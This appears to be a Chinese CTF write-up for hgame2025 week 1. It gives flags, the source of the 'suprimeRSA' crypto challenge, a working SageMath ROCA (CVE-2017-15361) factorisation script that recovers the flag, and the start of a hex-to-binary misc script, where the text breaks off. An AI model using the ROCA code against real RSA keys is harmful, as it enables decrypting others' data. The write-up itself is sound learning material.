    <content type="html"><![CDATA[<ul><li>hgame2025开打了，趁着寒假有时间，也就顺便打一下了。</li><li>今年的hgame只有两周，并非新生赛了，2024的hgame还有四周，前两周还是偏向新生的，可惜当时没坚持牢下来QAQ。</li></ul><h1 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h1><h2 id="test-nc"><a class="markdownIt-Anchor" href="#test-nc"></a> TEST NC</h2><ul><li>直接就是测试<code>nc</code>连接</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206124500125.png" alt="image-20250206124500125"></p><p>flag：<code>hgame&#123;YOUr-c@N_C0NNect-t0_THe_rem0TE_ENv1rOnmeNt-To_g3t-F1Ag0&#125;</code></p><h2 id="从这里开始的序章"><a class="markdownIt-Anchor" href="#从这里开始的序章"></a> 从这里开始的序章</h2><ul><li>flag在这边</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206124604520.png" alt="image-20250206124604520"></p><p>flag：<code>hgame&#123;Now-I-kn0w-how-to-subm1t-my-fl4gs!&#125;</code></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="suprimersa"><a class="markdownIt-Anchor" href="#suprimersa"></a> suprimeRSA</h2><ul><li>原来的附件出现了非预期，这边也放出来一下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#trick</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial</span>(<span class="params">num</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        result *= i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> factorial(a)+factorial(b)==a**b</span><br><span class="line"></span><br><span class="line">M=(a+b)&lt;&lt;<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = getPrime(<span class="number">29</span>)</span><br><span class="line">        a = getPrime(random.randint(<span class="number">20</span>,<span class="number">62</span>))</span><br><span class="line">        p = k * M + <span class="built_in">pow</span>(e, a, M)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(k))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(a))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(<span class="built_in">pow</span>(e,a,M)))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(k*M))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>,<span class="built_in">bin</span>(p))</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p,q = gen_key(),gen_key()</span><br><span class="line">n = p*q</span><br><span class="line">m=bytes_to_long(FLAG)</span><br><span class="line">enc=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e=&#x27;</span>,<span class="built_in">bin</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=669040758304155675570167824759691921106935750270765997139446851830489844731373721233290816258049</span></span><br><span class="line"><span class="string">enc=487207283176018824965268172307888245763817583875071008869370172565777230514379236733742846575849</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这边也给出更新后的附件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> prime</span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primorial</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        result *= prime(i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">M=primorial(random.choice([<span class="number">39</span>,<span class="number">71</span>,<span class="number">126</span>]))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = getPrime(random.randint(<span class="number">20</span>,<span class="number">40</span>))</span><br><span class="line">        a = getPrime(random.randint(<span class="number">20</span>,<span class="number">60</span>))</span><br><span class="line">        p = k * M + <span class="built_in">pow</span>(e, a, M)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p,q=gen_key(),gen_key()</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(FLAG)</span><br><span class="line">enc=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n.bit_length())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc=&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span></span><br><span class="line"><span class="string">enc=365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这边我是先对一开始的附件进行思考，发现可能可以用<code>coppersmith</code>攻击，去打<code>p</code>的低位，之后问了出题人，发现不是<code>coppersmith</code>打p的低位，这时就反复思考。还是往p、q的二进制位去想，也有想到p、q生成的形式问题。</li><li>之后上新附件后，我才确定就是<code>p = k*M + pow(e,a,M)</code>这个素数的生成漏洞，这时就去往这个方向搜素。</li><li>直到搜索到了这篇论文：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Attacks on the RSA Cryptosystem</span><br><span class="line">Notes by Henry Corrigan-Gibbs</span><br><span class="line">MIT - 6.5610</span><br><span class="line">Lecture 14 (March 22, 2023)</span><br></pre></td></tr></table></figure><ul><li>在这篇论文快结束的时候就看到了一个公司的RSA加密bug</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206130100864.png" alt="image-20250206130100864"></p><ul><li>这个时候就往<code>Infineon</code>这个公司去搜索，这样就搜索到了<code>CVE-2017-15361</code>，同时搜索到了这两篇博客。发现该题就是<code>ROCA</code>攻击</li></ul><p><a href="https://fcrumbling.github.io/2023/09/06/ROCA%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94CVE-2017-15361/">ROCA攻击——CVE-2017-15361 | crumbling’s secret room</a></p><p><a href="https://bitsdeep.com/posts/analysis-of-the-roca-vulnerability/#introduction">Analysis of the ROCA vulnerability · Bitsdeep</a></p><ul><li>同时发现了这篇论文</li></ul><p><a href="https://crocs.fi.muni.cz/_media/public/papers/nemec_roca_ccs17_preprint.pdf">nemec_roca_ccs17_preprint.pdf</a></p><ul><li>所以就照着学了一遍，之后就直接套脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">coppersmith_howgrave_univariate</span>(<span class="params">pol, modulus, beta, mm, tt, XX</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Taken from https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</span></span><br><span class="line"><span class="string">    Coppersmith revisited by Howgrave-Graham</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * b|modulus, b &gt;= modulus^beta , 0 &lt; beta &lt;= 1</span></span><br><span class="line"><span class="string">    * |x| &lt; XX</span></span><br><span class="line"><span class="string">    More tunable than sage&#x27;s builtin coppersmith method, pol.small_roots()</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    dd = pol.degree()</span><br><span class="line">    nn = dd * mm + tt</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># checks</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;beta should belongs in [0, 1]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pol.is_monic():</span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">&quot;Polynomial must be monic.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># calculate bounds and display them</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * we know LLL will give us a short vector v such that:</span></span><br><span class="line"><span class="string">    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * we will use that vector as a coefficient vector for our g(x)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * so we want to satisfy:</span></span><br><span class="line"><span class="string">    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)</span></span><br><span class="line"><span class="string">    (it&#x27;s important to use N because we might not know b)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Coppersmith revisited algo for univariate</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># change ring of pol and x</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute polynomials</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(dd):</span><br><span class="line">            gg.append((x * XX) ** jj * modulus ** (mm - ii) * polZ(x * XX) ** ii)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(tt):</span><br><span class="line">        gg.append((x * XX) ** ii * polZ(x * XX) ** mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>):</span><br><span class="line">            BB[ii, jj] = gg[ii][jj]</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform shortest vector in polynomial</span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        new_pol += x ** ii * BB[<span class="number">0</span>, ii] / XX ** ii</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor polynomial</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test roots</span></span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> potential_roots:</span><br><span class="line">        <span class="keyword">if</span> root[<span class="number">0</span>].is_integer():</span><br><span class="line">            result = polZ(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> gcd(modulus, result) &gt;= modulus ** beta:</span><br><span class="line">                roots.append(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">M, n, a, m</span>):</span><br><span class="line">    <span class="comment"># I need to import it in the function otherwise multiprocessing doesn&#x27;t find it in its context</span></span><br><span class="line">    <span class="comment"># from sage_functions import coppersmith_howgrave_univariate</span></span><br><span class="line"></span><br><span class="line">    base = <span class="built_in">int</span>(<span class="number">65537</span>)</span><br><span class="line">    <span class="comment"># the known part of p: 65537^a * M^-1 (mod N)</span></span><br><span class="line">    known = <span class="built_in">int</span>(<span class="built_in">pow</span>(base, a, M) * inverse_mod(M, n))</span><br><span class="line">    <span class="comment"># Create the polynom f(x)</span></span><br><span class="line">    F = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>, names=(<span class="string">&#x27;x&#x27;</span>,))</span><br><span class="line">    (x,) = F._first_ngens(<span class="number">1</span>)</span><br><span class="line">    pol = x + known</span><br><span class="line">    beta = <span class="number">0.1</span></span><br><span class="line">    t = m + <span class="number">1</span></span><br><span class="line">    <span class="comment"># Upper bound for the small root x0</span></span><br><span class="line">    XX = floor(<span class="number">2</span> * n**<span class="number">0.5</span> / M)</span><br><span class="line">    <span class="comment"># Find a small root (x0 = k) using Coppersmith&#x27;s algorithm</span></span><br><span class="line">    roots = coppersmith_howgrave_univariate(pol, n, beta, m, t, XX)</span><br><span class="line">    <span class="comment"># There will be no roots for an incorrect guess of a.</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">        <span class="comment"># reconstruct p from the recovered k</span></span><br><span class="line">        p = <span class="built_in">int</span>(k * M + <span class="built_in">pow</span>(base, a, M))</span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> p, n // p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roca</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    keySize = n.bit_length()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> keySize &lt;= <span class="number">960</span>:</span><br><span class="line">        M_prime = <span class="number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span></span><br><span class="line">        m = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">992</span> &lt;= keySize &lt;= <span class="number">1952</span>:</span><br><span class="line">        M_prime = <span class="number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span></span><br><span class="line">        m = <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Have you several days/months to spend on this ?&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">1984</span> &lt;= keySize &lt;= <span class="number">3936</span>:</span><br><span class="line">        M_prime = <span class="number">0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span></span><br><span class="line">        m = <span class="number">7</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You&#x27;ll change computer before this scripts ends...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">3968</span> &lt;= keySize &lt;= <span class="number">4096</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Just no.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid key size: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(keySize))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    a3 = Zmod(M_prime)(n).log(<span class="number">65537</span>)</span><br><span class="line">    order = Zmod(M_prime)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">    inf = a3 // <span class="number">2</span></span><br><span class="line">    sup = (a3 + order) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Search 10 000 values at a time, using single process</span></span><br><span class="line">    chunk_size = <span class="number">10000</span></span><br><span class="line">    <span class="keyword">for</span> inf_a <span class="keyword">in</span> <span class="built_in">range</span>(inf, sup, chunk_size):</span><br><span class="line">        <span class="comment"># create an array with the parameter for the solve function</span></span><br><span class="line">        inputs = [(M_prime, n, a, m) <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(inf_a, inf_a + chunk_size)]</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(inf_a, inf_a + chunk_size):</span><br><span class="line">            result = solve(M_prime, n, a, m)</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                p, q = result</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found factorization:\np=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># For testing, use a sample n value</span></span><br><span class="line">    n = <span class="number">787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting factorization...&quot;</span>)</span><br><span class="line">    <span class="comment">#p,q = roca(n)</span></span><br><span class="line">    p=<span class="number">954455861490902893457047257515590051179337979243488068132318878264162627</span></span><br><span class="line">    q=<span class="number">824752716083066619280674937934149242011126804999047155998788143116757683</span></span><br><span class="line">    enc=<span class="number">365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span></span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(enc,d,n)</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;ROCA_ROCK_and_ROll!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>hgame&#123;ROCA_ROCK_and_ROll!&#125;</code></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="hakuya-want-a-girl-friend"><a class="markdownIt-Anchor" href="#hakuya-want-a-girl-friend"></a> Hakuya Want A Girl Friend</h2><ul><li>打开附件发现是一大堆的十六进制。</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102221433.png" alt="image-20250211102221433"></p><ul><li>这可能是某个文件的二进制形式，就将这个文本转换为二进制形式进行输出</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 将十六进制字符串转化为字节序列</span></span><br><span class="line">    hex_values = hex_str.split()  <span class="comment"># 按空格分隔</span></span><br><span class="line">    byte_array = <span class="built_in">bytes</span>(<span class="built_in">int</span>(value, <span class="number">16</span>) <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">reversed</span>(hex_values))  <span class="comment"># 将每个16进制字符串转换为字节</span></span><br><span class="line">    <span class="built_in">print</span>(byte_array)</span><br><span class="line">    <span class="keyword">return</span> byte_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 读取输入文件中的16进制数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">        hex_str = infile.read().strip()  <span class="comment"># 读取文件并去掉两端的空白符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    byte_data = hex_to_bytes(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节数据写入输出文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        outfile.write(byte_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&quot;E:\CTF题目附件\\2025年CTF题目附件\hgame2025\misc\Hakuya Want A Girl Friend.txt&quot;</span>  <span class="comment"># 输入文件路径</span></span><br><span class="line">    output_filename = <span class="string">&quot;output.bin&quot;</span>  <span class="comment"># 输出文件路径</span></span><br><span class="line">    convert_file(input_filename, output_filename)</span><br><span class="line"></span><br><span 